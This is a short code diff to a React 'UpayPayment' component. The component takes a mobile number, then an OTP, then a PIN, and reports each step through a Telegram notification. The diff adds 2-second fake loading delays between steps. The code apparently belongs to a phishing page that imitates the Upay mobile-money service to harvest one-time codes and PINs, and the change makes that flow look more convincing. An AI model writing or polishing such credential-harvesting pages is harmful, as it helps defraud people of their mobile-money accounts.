@@ -57,8 +57,12 @@ const UpayPayment = () => {
 
   const handleMobileSubmit = () => {
     if (!isValidMobile()) return;
+    setIsTransitioning(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
-    setStep('otp');
+    setTimeout(() => {
+      setStep('otp');
+      setIsTransitioning(false);
+    }, 2000);
   };
 
   const handleOtpSubmit = () => {
@@ -67,9 +71,12 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
+    setIsTransitioning(true);
     sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
-
-    setStep('pin');
+    setTimeout(() => {
+      setStep('pin');
+      setIsTransitioning(false);
+    }, 2000);
   };
 
   const handlePinSubmit = () => {
